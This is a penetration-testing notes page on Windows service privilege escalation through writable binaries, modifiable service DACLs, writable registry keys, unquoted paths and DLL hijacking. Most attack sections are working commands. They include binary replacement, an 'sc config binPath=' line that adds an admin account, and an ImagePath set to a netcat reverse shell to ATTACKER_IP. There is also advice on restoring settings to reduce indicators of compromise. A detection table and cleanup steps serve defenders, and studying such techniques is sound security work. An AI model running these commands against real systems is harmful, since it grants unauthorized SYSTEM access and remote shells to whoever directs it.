+++
title = 'File System ACLs & Service Permissions'
date = 2026-10-30
type = 'notes'
weight = 40
toc = true
tags = ['windows', 'privilege-escalation', 'acls', 'services']
+++

Windows services are one of the most common privilege escalation paths because they often run as `LocalSystem` while pointing to files, service objects, or registry keys that normal users can influence. Three separate misconfigurations can grant SYSTEM, and they are often confused:

| Attack surface | You control | Exploitation | Primary check |
|---|---|---|---|
| **Writable binary** | The `.exe` on disk | Replace the file, restart the service | `icacls` on the binary |
| **Modifiable service DACL** | The service object | Change `binPath=`, restart the service | `accesschk -uwcqv` |
| **Writable registry key** | The service's registry entry | Edit `ImagePath`, restart the service | `accesschk -kvuqsw` on `HKLM\...\Services` |

> **Key distinction:** A writable binary is a **file-system** problem. A modifiable service DACL is a **service-object** problem — you do not need write access to the binary's directory, only permission to reconfigure the service itself.

---

## Triage — Which One Do I Have?

```cmd
:: 1. Writable service binaries
.\SharpUp.exe audit
:: or PowerUp
Get-ModifiableServiceFile

:: 2. Modifiable service DACLs
accesschk.exe /accepteula -uwcqv "Users" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "%USERNAME%" *

:: 3. Writable service registry keys
accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\services

:: 4. Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

`SharpUp audit` reports **Modifiable Service Binaries** and **Modifiable Services** in separate sections — do not stop reading at the first hit. PowerUp's `Invoke-AllChecks` covers all four surfaces, but `Get-ModifiableService` and `Get-ModifiableServiceFile` are the two functions that map directly to the DACL and binary attacks.

---

## 1. Writable Service Binary (File-System ACL)

> If the binary a **SYSTEM-run service** executes — or a DLL/config file it loads — is writable by your user, replacing it with a payload and restarting the service executes your code as SYSTEM.

### 1.1 Enumerate and verify

```cmd
icacls "C:\Program Files\Vuln Service\service.exe"
```

Look for **`(F)`** (full), **`(M)`** (modify), or **`(W)`** (write) on a principal you belong to. **`(I)` alone only means the entry was inherited** — it is not a permission level. An entry such as `BUILTIN\Users:(I)(F)` **is** a full compromise of that file.

A useful one-liner that pulls every auto-start service binary and checks it:

```cmd
for /f eol^=^"^ delims^=^" %a in ('wmic service get pathname /value ^| findstr "="') do @icacls "%a" 2>nul | findstr /i "(F) (M) (W)"
```

### 1.2 Exploit — replace and restart

```cmd
:: Back up the original first
copy "C:\Program Files\Vuln Service\service.exe" C:\Temp\service.exe.bak

:: Replace with a payload
copy /Y C:\Temp\payload.exe "C:\Program Files\Vuln Service\service.exe"

:: Restart
sc stop VulnService & sc start VulnService
```

Common writable targets beyond the main binary:

- **A DLL the service loads** — see the DLL hijacking subsection below.
- **A config or log file the service reads** at startup.
- **A script invoked by a scheduled task** that the service creates.

### 1.3 DLL hijacking — the writable-directory variant

The service binary may be perfectly protected while a **directory it loads DLLs from is writable**. A real 2025 example is **CVE-2025-13051** (ABP/AES): the service was installed in a directory writable by non-administrative users, and a malicious DLL with the same name as one the service loads was executed as `LocalSystem` on restart. **CVE-2025-61161** (Evope Collector) is the same pattern — `Evope.Service.exe` loads `wtsapi32.dll` from `C:\ProgramData\Evope`, which an unprivileged user can write.

```powershell
# Find writable directories that host SYSTEM service binaries
Get-ChildItem "C:\Program Files","C:\Program Files (x86)","C:\ProgramData" -Directory -ErrorAction SilentlyContinue |
  ForEach-Object { $p = $_.FullName; icacls $p 2>$null | Select-String "BUILTIN\\Users.*\(F\)|Everyone.*\(F\)" } |
  Select-Object -Unique
```

> **Machine PATH is a separate, easy-to-miss surface.** If you can write to a directory in the **system-wide** `PATH` (not your user `PATH`), a privileged service that fails to find a DLL in its normal search locations may eventually search that writable PATH directory. A writable Machine PATH entry is only a **primitive**, not proof of code execution — the loader must actually reach the PATH stage.

---

## 2. Modifiable Service DACL (`SERVICE_CHANGE_CONFIG`)

> The **service object** has its own ACL, separate from the binary. If your user holds **`SERVICE_CHANGE_CONFIG`** or **`SERVICE_ALL_ACCESS`** on a SYSTEM service, you can change its `binPath` to anything — no write access to the binary's directory is required.

### 2.1 Enumerate

```cmd
:: Services the current user can modify
accesschk.exe /accepteula -uwcqv "%USERNAME%" *

:: Groups you may belong to
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "BUILTIN\Users" *
```

Exploitable rights:

| Right | Meaning |
|---|---|
| **`SERVICE_ALL_ACCESS`** | Full control over the service |
| **`SERVICE_CHANGE_CONFIG`** | Can modify the binary path |
| **`WRITE_DAC`** | Can rewrite the service ACL to grant yourself more access |

Confirm the service runs as SYSTEM before investing time:

```cmd
sc qc VulnerableService
:: look for SERVICE_START_NAME : LocalSystem
```

If it runs as a lower-privileged account, this technique escalates only to that account level.

### 2.2 Exploit — `sc config binPath=`

```cmd
sc config VulnerableService binPath= "cmd /c net localgroup administrators pwn /add"
sc stop VulnerableService
sc start VulnerableService
```

> **The space after `binPath=` is mandatory.** Without it, `sc` returns **error 87 "The parameter is incorrect"**.

**Expected error 1053.** Starting the service will often return **error 1053** ("The service did not respond in a timely fashion") because `cmd.exe` is not a real service. **The command still executes** — check `net localgroup administrators`.

### 2.3 Edge cases

- **`SERVICE_CHANGE_CONFIG` without start/stop rights.** If `sc stop`/`sc start` is denied, you may only be able to reconfigure. Use `sc config <svc> start= auto` and wait for a reboot, or find another service you *can* restart that shares the same binary.
- **Low-privileged service account.** Adding yourself to Administrators still works, but you may need to **log off and back on** before the group membership appears in your token.
- **Restore the original path afterwards** to reduce IOCs: `sc config VulnerableService binPath= "<original>"`.

PowerUp automates the DACL attack: `Get-ModifiableService` identifies the service, and `Invoke-ServiceAbuse -Name "VulnSvc"` performs the `binPath` change.

---

## 3. Writable Service Registry Key (ImagePath)

> A third, distinct misconfiguration: the service's **registry key** under `HKLM\SYSTEM\CurrentControlSet\Services\<name>` is writable. You can edit `ImagePath` directly, which is equivalent to changing `binPath` but does not require `SERVICE_CHANGE_CONFIG`.

### 3.1 Enumerate

```cmd
accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\services
```

Look for **`KEY_ALL_ACCESS`** or **`KEY_WRITE`** on a key that belongs to a SYSTEM service. A real example from HTB-style labs:

```
RW HKLM\System\CurrentControlSet\Services\ModelManagerService : KEY_ALL_ACCESS
```

### 3.2 Exploit — edit `ImagePath`

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" `
  -Name "ImagePath" -Value "C:\Tools\nc.exe -e cmd.exe ATTACKER_IP 4444"

sc.exe stop ModelManagerService
sc.exe start ModelManagerService
```

> **`ImagePath` is the registry equivalent of `binPath`.** If the DACL blocks `sc config` but the registry key is writable, this is the path — and it generates different detection signals (registry write vs. `sc.exe` process creation).

---

## 4. Unquoted Service Path

> A path containing spaces but **no quotation marks** makes Windows try each space-delimited prefix as an executable. If any intermediate directory is writable, you can drop a binary there and it runs as the service account.

### 4.1 Enumerate

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

For a path like:

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows tries, in order:

```
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\System.exe          ← if writable, hijack here
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```



### 4.2 Exploit

```cmd
:: Identify a writable intermediate directory
icacls "C:\Program Files (x86)" | findstr /i "Users\|Everyone"

:: Drop the payload with the exact expected name
copy /Y C:\Temp\payload.exe "C:\Program Files (x86)\System.exe"

:: Restart the service (or wait for a reboot)
sc stop VulnService & sc start VulnService
```

The vulnerability class is still actively disclosed in 2025 — **CVE-2025-66264** (ClientMate `CMService.exe`), **CVE-2025-66271** (ELECOM Clone), and **CVE-2025-8070** (ABP/AES) are all unquoted service path flaws in SYSTEM services.

---

## 5. Detection and Cleanup (What Defenders See)

If you are documenting the path or writing detection logic, note the signals each technique leaves:

| Technique | Primary event |
|---|---|
| `sc config binPath=` | Sysmon 1 / 4688 — `sc.exe config ... binpath` |
| Registry `ImagePath` edit | Sysmon 13 / `reg.exe` command line |
| New service installed | System 7045 / Security 4697 |
| Service binary replaced | Sysmon 11 — file write to a service binary by a non-admin |
| Service stop/start from non-admin | System 7036 / EDR |

**Event 7045 does not fire when an existing service is reconfigured** — the reliable `sc config` signal is the **process creation** for `sc.exe` itself.

### Cleanup

```cmd
:: Restore the binary
copy /Y C:\Temp\service.exe.bak "C:\Program Files\Vuln Service\service.exe"

:: Restore the service path
sc config VulnService binPath= "<original path>"

:: Remove a test admin account
net localgroup administrators pwn /delete
```

> **Restore the original binary and service configuration after testing.** Leaving a replaced SYSTEM binary or a modified `binPath` is both a stability risk and an obvious IOC.

---

## Quick Reference

| Technique | Enumerate | Exploit | Edge case |
|---|---|---|---|
| **Writable binary** | `icacls "C:\path\svc.exe"` | Replace → `sc stop/start` | `(I)` is not a permission; check `(F)/(M)/(W)` |
| **Modifiable service DACL** | `accesschk -uwcqv %USERNAME% *` | `sc config svc binPath= "cmd /c ..."` | Mandatory space after `=`; error 1053 is expected |
| **Writable registry key** | `accesschk -kvuqsw hklm\...\services` | `Set-ItemProperty ... ImagePath` | Generates registry-write telemetry, not `sc.exe` |
| **Unquoted service path** | `wmic service get ...` | Drop `C:\Program.exe` or intermediate | Intermediate directory must be writable |
| **DLL hijack (writable dir)** | Check service install directories | Plant DLL with expected name → restart | Machine PATH is a separate surface |

---

## Field Notes

- **Three distinct surfaces, three different checks.** A writable binary is not the same as a modifiable service DACL, which is not the same as a writable registry key. Run all four enumeration commands in the Triage section.
- **`SharpUp audit` separates binary and DACL findings.** Read both sections before concluding a host is clean.
- **`(I)` does not mean you have access.** Inherited entries require the underlying `(F)/(M)/(W)` on a group you belong to.
- **`sc config` needs the space.** `binPath= "..."` — not `binPath="..."`.
- **Error 1053 is not a failure.** The payload ran; the service just did not behave like a service.
- **DLL hijacking is alive and well in 2025.** CVE-2025-13051 and CVE-2025-61161 are both writable-directory DLL hijacks in SYSTEM services.
- **Unquoted service paths are still being disclosed.** CVE-2025-66264 and CVE-2025-8070 are current examples in SYSTEM services.

---

This file sits alongside the **Built-in Groups Abuse** and **Excessive User Rights Abuse** notes: a Backup Operator or Server Operator lands with these rights already present, and a writable service binary is often the fastest SYSTEM path after `SeImpersonate` has been ruled out.
